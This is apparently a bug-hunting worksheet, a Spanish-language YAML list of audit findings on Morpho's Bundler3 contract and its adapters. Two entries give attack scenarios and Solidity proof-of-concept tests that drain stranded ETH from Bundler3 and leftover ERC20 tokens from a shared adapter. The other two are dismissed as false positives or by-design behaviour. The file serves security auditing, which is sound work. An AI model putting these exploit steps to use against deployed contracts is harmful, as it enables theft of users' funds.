- id: B3-FL-01
  tier: 1
  type: property
  description: >
    ETH stranding via skipRevert=true + value>0: si un call con value falla y skipRevert
    absorbe el revert, el ETH queda en Bundler3 sin dueño. Cualquier usuario posterior
    puede extraerlo llamando multicall con value=0 y un call que solicite ese ETH.
  attack_scenario: >
    1. Usuario A llama multicall{value: 1 ether} con bundle=[{to: contractQueRevierte,
       value: 1 ether, skipRevert: true, callbackHash: 0x0, data: "0xdead"}].
    2. to.call{value: 1 ether}(data) revierte. skipRevert=true permite continuar.
    3. El ETH (1 ether) permanece en Bundler3.balance — no hay mecanismo de refund al initiator.
    4. Atacante B monitorea Bundler3.balance. Cuando detecta saldo >0:
       multicall{value: 0}([{to: atacanteB, data: "", value: Bundler3.balance, skipRevert: false, callbackHash: 0x0}]).
    5. Bundler3 envía todo su balance al atacante B.
    Variante: front-running — atacante ve tx de usuario con skipRevert+value en mempool y
    prepara tx de extracción.
  impact: >
    Robo directo de ETH. Magnitud = cualquier ETH que quede stranded en Bundler3.
    El Bundler3 no aísla ETH por transacción: address(this).balance es pool compartido.
  impact_rating: High
  likelihood: Medium
  severity_final: null
  confidence: 85
  call_stack: >
    Bundler3.multicall{value}
      → _multicall
        → to.call{value: bundle[i].value}(bundle[i].data) — REVERTS
        → skipRevert=true → continue
      → initiator = address(0) — NO refund del ETH no gastado
    ---
    Atacante: Bundler3.multicall{value: 0}
      → to.call{value: Bundler3.balance}("") — ETH enviado al atacante
  solidity: |
    // PoC: ETH stranding + theft
    uint256 balBefore = address(bundler3).balance;
    Call[] memory bundle = new Call[](1);
    bundle[0] = Call({to: revertingContract, data: hex"dead", value: 1 ether,
                      skipRevert: true, callbackHash: bytes32(0)});
    vm.prank(userA);
    bundler3.multicall{value: 1 ether}(bundle);
    assertEq(address(bundler3).balance, balBefore + 1 ether, "ETH stranded");

    // Attacker extracts
    uint256 attackerBal = attacker.balance;
    Call[] memory steal = new Call[](1);
    steal[0] = Call({to: attacker, data: "", value: address(bundler3).balance,
                     skipRevert: false, callbackHash: bytes32(0)});
    vm.prank(attacker);
    bundler3.multicall{value: 0}(steal);
    assertGt(attacker.balance, attackerBal, "Attacker stole stranded ETH");
  ghost_vars: []
  validated: false
  priority: critical
  notes: >
    Patrón idéntico a 3DNS HIGH pagado en Solodit. Morpho documenta "should not be
    approved/authorized anywhere", pero eso NO protege al usuario que envía ETH legítimamente.
    MITIGACIÓN esperada: (a) devolver ETH sobrante al initiator al final de multicall, o
    (b) require(address(this).balance == 0) al final de multicall.
    CONTRAARGUMENTO: Morpho podría decir que skipRevert+value es responsabilidad del usuario.
    Pero el ETH residual de un usuario es robable por CUALQUIER otro usuario — eso es un bug.

- id: B3-FL-02
  tier: 1
  type: property
  description: >
    Tokens residuales en adapters entre calls de un bundle: los tokens se envían al adapter
    en un call y se usan en el siguiente. Si un call intermedio falla con skipRevert=true,
    los tokens quedan en el adapter y pueden ser robados por el siguiente usuario que ejecute
    un bundle usando erc20Transfer(token, attacker, type(uint256).max).
  attack_scenario: >
    1. Usuario A construye bundle:
       Call 0: permit2TransferFrom(USDC, adapter, 10000e6) — mueve USDC del initiator al adapter
       Call 1: morphoSupply(market, type(uint256).max, ...) — usa esos USDC para supply
    2. Si Call 1 revierte (e.g., market paused) y skipRevert=true, los 10000 USDC quedan en el adapter.
    3. Adapter es un contrato compartido — cualquier usuario puede llamar funciones via Bundler3.
    4. Atacante B llama multicall con:
       Call 0: erc20Transfer(USDC, atacanteB, type(uint256).max) — drena todo el USDC del adapter.
    5. erc20Transfer usa IERC20(token).balanceOf(address(this)) cuando amount=max. No verifica ownership.
  impact: >
    Robo directo de tokens ERC20 del adapter. Los adapters son stateless por diseño, pero
    tokens residuales de bundles fallidos parcialmente (skipRevert) crean un pool robable.
  impact_rating: High
  likelihood: Medium
  severity_final: null
  confidence: 80
  call_stack: >
    Víctima: multicall → permit2TransferFrom(USDC, adapter, 10000e6) ✓
           → morphoSupply(...) REVERTS + skipRevert=true → 10000 USDC stranded in adapter
    Atacante: multicall → erc20Transfer(USDC, attacker, type(uint256).max)
           → IERC20(USDC).balanceOf(adapter) == 10000e6 → transfer al atacante
  solidity: |
    // Simulate tokens stranded in adapter after partial bundle failure
    deal(address(USDC), address(adapter), 10000e6); // simulates stranded tokens
    uint256 attackerBal = USDC.balanceOf(attacker);
    Call[] memory bundle = new Call[](1);
    bundle[0] = Call({
      to: address(adapter),
      data: abi.encodeCall(adapter.erc20Transfer, (address(USDC), attacker, type(uint256).max)),
      value: 0, skipRevert: false, callbackHash: bytes32(0)
    });
    vm.prank(attacker);
    bundler3.multicall(bundle);
    assertEq(USDC.balanceOf(attacker), attackerBal + 10000e6);
  ghost_vars: []
  validated: false
  priority: critical
  notes: >
    Similar a B3-FL-01 pero con ERC20 en lugar de ETH. La misma root cause: los adapters
    son compartidos y no distinguen a quién pertenecen los tokens residuales.
    CONTRAARGUMENTO: Morpho dice que los adapters son stateless. Pero skipRevert viola
    ese invariante al permitir que un bundle falle parcialmente, dejando tokens en tránsito.
    SIN skipRevert, el bundle completo revierte y los tokens vuelven al origen.
    La combinación de skipRevert + tokens en tránsito es el vector real.

- id: B3-FL-03
  tier: 1
  type: property
  description: >
    ParaswapAdapter: max approval a Augustus no se revoca si augustus.call() revierte con
    skipRevert=true en el bundle externo. Augustus queda con max allowance del adapter
    para srcToken indefinidamente.
  attack_scenario: >
    1. El flow normal de swap() es: forceApprove(max) → augustus.call → forceApprove(0).
    2. PERO: la función swap() tiene onlyBundler3. Bundler3 llama al adapter via to.call().
    3. Si la llamada al adapter completa exitosamente (swap ejecuta forceApprove→call→forceApprove(0)),
       no hay problema. El approval se resetea dentro de swap().
    4. VECTOR: Si swap() revierte DESPUÉS de forceApprove(max) pero ANTES de forceApprove(0),
       el approval queda en max. Esto puede ocurrir si:
       - augustus.call revierte (success=false → UtilsLib.lowLevelRevert)
       - Pero ESPERA: si augustus.call revierte → swap revierte → adapter call revierte
         → Bundler3 ve !success y si skipRevert=false, revierte todo
         → Si skipRevert=true, continúa pero el estado del adapter (incluyendo el approval)
           SE REVIERTE porque la call al adapter misma falló (EVM revierte estado de la subcall).
    5. CORRECCIÓN DE MI ANÁLISIS: cuando to.call{value}(data) falla en Bundler3._multicall,
       TODO el estado de esa subcall se revierte (incluyendo approvals). El skipRevert solo
       permite al loop continuar, pero la subcall reverted = estado revertido.
    CONCLUSIÓN: FALSE POSITIVE. El EVM revierte los side effects de la subcall fallida.
    El approval nunca queda en max si swap() revierte.
  impact: "N/A — False positive descartado tras análisis EVM"
  impact_rating: Info
  likelihood: None
  severity_final: null
  confidence: 95
  call_stack: >
    Bundler3._multicall → to.call(data) → ParaswapAdapter.swap()
      → forceApprove(max) → augustus.call() → REVERTS
      → UtilsLib.lowLevelRevert() → swap() REVERTS
      → to.call() returns (false, ...) → skipRevert=true → continue
      → PERO: el approval de forceApprove(max) SE REVIRTIÓ con la subcall
  solidity: null
  ghost_vars: []
  validated: false
  priority: low
  notes: >
    Analizado en detalle y descartado. El EVM garantiza atomicidad de subcalls:
    si to.call() falla, todo su estado interno (storage writes, approvals) se revierte.
    skipRevert solo controla si el loop de Bundler3 continúa, no si los side effects persisten.

- id: B3-FL-04
  tier: 1
  type: property
  description: >
    Flash loan via morphoFlashLoan → onMorphoFlashLoan → reenterBundler3: durante el
    callback, el adapter tiene los tokens del flash loan. El reenter-bundle puede ejecutar
    operaciones arbitrarias con esos tokens. Si el callbackHash fue crafteado correctamente,
    un atacante puede usar flash loans para amplificar ataques.
  attack_scenario: >
    1. Atacante llama multicall con:
       Call 0: morphoFlashLoan(USDC, 10M USDC, callbackData) con callbackHash correcto.
    2. Morpho envía 10M USDC al adapter y llama onMorphoFlashLoan.
    3. onMorphoFlashLoan → morphoCallback → reenterBundler3(data).
    4. Dentro del reenter-bundle, el atacante puede ejecutar cualquier operación:
       - erc20Transfer(USDC, atacante, 10M) → roba los USDC del flash loan.
       - PERO: Morpho espera que el adapter tenga 10M + fee USDC al final del flash loan.
       - Si el adapter no tiene esos tokens, la tx de Morpho.flashLoan revierte.
    5. CONCLUSIÓN: el flash loan NO permite robo directo porque Morpho verifica el repago.
       PERO: permite manipulación temporal del mercado dentro del callback:
       - Supply 10M como collateral → borrow otro asset → withdraw collateral
       - Todo dentro del reenter-bundle, antes de repagar el flash loan.
       - Esto es "by design" — flash loans son para esto.
    6. El riesgo real: ¿puede el atacante hacer que el adapter APRUEBE tokens a un tercero
       durante el callback, y que esa aprobación persista DESPUÉS del flash loan?
       - morphoSupply: forceApprove(MORPHO, max) → NO se resetea (Morpho es trusted)
       - Pero esto no da control al atacante — Morpho no es malicioso.
       - erc4626Deposit: forceApprove(vault, max) → SE resetea a 0 después.
       - swap: forceApprove(augustus, max) → SE resetea a 0 después.
       - CONCLUSIÓN: no hay approval leak explotable durante flash loan callbacks.
  impact: "Flash loans durante callbacks funcionan correctamente. No hay leak de approvals ni robo de tokens."
  impact_rating: Info
  likelihood: Low
  severity_final: null
  confidence: 90
  call_stack: >
    multicall → adapter.morphoFlashLoan(token, amount, data)
      → forceApprove(token, MORPHO, max) [NOT RESET — by design, Morpho trusted]
      → MORPHO.flashLoan(token, amount, data)
        → adapter.onMorphoFlashLoan(amount, data)
          → morphoCallback(data) [require msg.sender == MORPHO]
            → reenterBundler3(data)
              → Bundler3.reenter(bundle) [verified via reenterHash]
                → _multicall(bundle) — arbitrary ops with flash-loaned tokens
              → returns to Morpho
            → Morpho pulls repayment from adapter (via forceApprove max permanente)
  solidity: null
  ghost_vars: []
  validated: false
  priority: medium
  notes: >
    Analizado exhaustivamente. Los flash loans de Morpho son seguros dentro del contexto
    de Bundler3 porque: (1) Morpho verifica repago, (2) approvals a Morpho son by design,
    (3) approvals a terceros (vaults, Augustus) se resetean a 0.
    El único concern restante es si operaciones DENTRO del callback pueden dejar el adapter
    en un estado inconsistente — pero como el adapter es stateless (no tiene storage mutable),
    esto no aplica.

